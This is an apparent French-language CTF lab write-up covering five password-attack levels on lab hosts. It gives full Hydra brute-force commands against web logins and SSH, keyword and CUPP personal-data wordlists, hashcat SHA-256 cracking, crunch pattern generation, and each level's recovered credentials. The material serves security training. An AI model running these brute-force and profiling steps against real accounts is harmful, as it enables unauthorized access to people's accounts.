## Résolution du nom de domaine

Resolution DNS dans `/etc/hosts`.

Ajout manuel :

```bash
10.128.138.231 firewall.thm jobs.thm social.thm



Vérification :
ping firewall.thm

Résultat :
64 bytes from firewall.thm

Scan du port :

nmap firewall.thm -p 5001

5001/tcp open
```

---
# Level 1 - Weak Password
## Analyse de l'application

Dans Network => Verification des paramètres de la requete POST + test du formulaire :

```bash
curl -i -X POST http://firewall.thm:5001/login \-d "username=admin&password=test"
```


```bash
Le formulaire envoie une requête POST vers :

/login

Paramètres observés :

username=admin
password=test

et réponse :
user=admin&password=test | Invalid credentials
```

---

## Brute-force Hydra 

```bash
hydra -V -s 5001 \
-l admin \
-P /usr/share/wordlists/rockyou.txt \
firewall.thm \
http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"


Resultat - Password Level 1 :
login: admin
password: 12345

```

## Vulnérabilité

Utilisation d'un mot de passe faible présent dans les dictionnaires publics.

---
# Level 2 - Company Keywords

### Énoncé

> Marco built an internal Employee Login panel on jobs.thm:5002 and used common company keywords as passwords.

L'objectif est d'identifier un mot de passe construit à partir des mots-clés utilisés par l'entreprise.

## Analyse du site

Récupération du contenu :

```
curl http://jobs.thm:5002
```

Plusieurs mots-clés apparaissent fréquemment :

```
Engineering
Innovation
Excellence
Security
Digital
Cloud
Future
Talent
MHT Labs
```

Ces mots représentent des candidats pertinents pour construire une wordlist ciblée.

---

## Construction d'une wordlist

Création du fichier :

```
nano level2.txt


Contenu :
mht
labs
mhtlabs
engineering
careers
innovation
excellence
security
digital
cloud
future
talent
```

---

## Brute-force ciblé avec Hydra

Commande :

```bash
hydra -V -f -t 4 \
-s 5002 \
-l marco \
-P level2.txt \
jobs.thm \
http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

```
```
Explications :
- `-V` : Verbose - affiche chaque tentative.
- `-f` : s'arrête au premier succès.
- `-t 4` : utilise 4 threads.
- `-l marco` : utilisateur connu.
- `-P level2.txt` : wordlist ciblée construite à partir du site.
```
```bash
Résultat - Password Level 2 :

login: marco
password: excellence
```

### Vulnérabilité identifiée

Utilisation de mots de passe basés sur des mots-clés publics de l'entreprise.

---
# Level 3 - Personal Information OSINT

## Installation de CUPP

Première tentative :

```bash
git clone https://github.com/Mebus/cupp.git
```

## Génération d'une wordlist personnalisée

```bash
Execution de cupp :
python3 cupp.py -i


Informations collectées :
First Name : Marco
Surname : Bianchi
Nickname : marky
Birthdate : 14021995


Options :

Keywords      : N
Special chars : Y
Random nums   : Y
Leet mode     : N


Résultat :
Saving dictionary to marco.txt
7400 words generated
```

## Brute-force Hydra

```bash
hydra -l marco -P marco.txt -f -V -t 4 \
social.thm \
http-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid" \
-s 5003


Résultat - Password Level 3 :
login: marco
password: Bianchi2495
```

## Vulnérabilité

Utilisation d'informations personnelles

---

# Level 4 - Hashed Profile Picture Filename

## Analyse du code source

Commentaire HTML :

```bash
<!-- Post: Profile picture stored filename (Level 4) -->

/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

## Téléchargement

```bash
wget http://social.thm:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png


## Analyse du fichier

file d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png

Résultat :
PNG image data, 1536 x 1024


## Analyse des métadonnées
exiftool d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
# Aucune information exploitable.
```

## Cracking du hash

Création du fichier :

```bash
nano hash.txt

Contenu :
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
```

Utilisation de Hashcat :

```bash
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
```text
Options :
-m 1400 => SHA - 256
-a 0 => Attack mode dicitonary
```
```bash

Résultat -  Password Level 4 :

d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:'family'
```

## Vulnérabilité

Le hachage seul n'est pas une protection suffisante lorsque la donnée est prévisible.

---

# Level 5 - Predictable Password Pattern

## Indice : 

```bash
I take a company keyword,
capitalize it,
append the year
and an exclamation mark.


Mots-clés observés :

security
excellence
innovation
digital
cloud
```

## Construction de la wordlist

```bash
crunch 13 13 -t Security20%%! -o pass_marco.txt

### Explication des paramètres  
  
 
- 13 13 : Génère des mots de passe de 13 caractères minimum et maximum
- t : Utilise un modèle (pattern) personnalisé
- % : Charactère à remplacer [0-9]

Resultat : 
Security2000!
Security2001!
...
Security2024!
...
Security2029!
```

## Brute-force SSH

```bash
hydra -l marco \
-P pass_marco.txt \
10.130.176.87 \
-t 4 \
ssh


Résultat - Password Level 5 :

login: marco
password: Security2024!
```

## Vulnérabilité

Marco divulgue sa méthode de construction des mots de passe et réutilise un schéma prédictible.

---

# Conclusion

| Level | Faiblesse                         |
| ----- | --------------------------------- |
| 1     | Mot de passe faible               |
| 2     | Mot-clé public de l'entreprise    |
| 3     | Informations personnelles (OSINT) |
| 4     | Donnée hashée mais prévisible     |
| 5     | Schéma de génération réutilisé    |
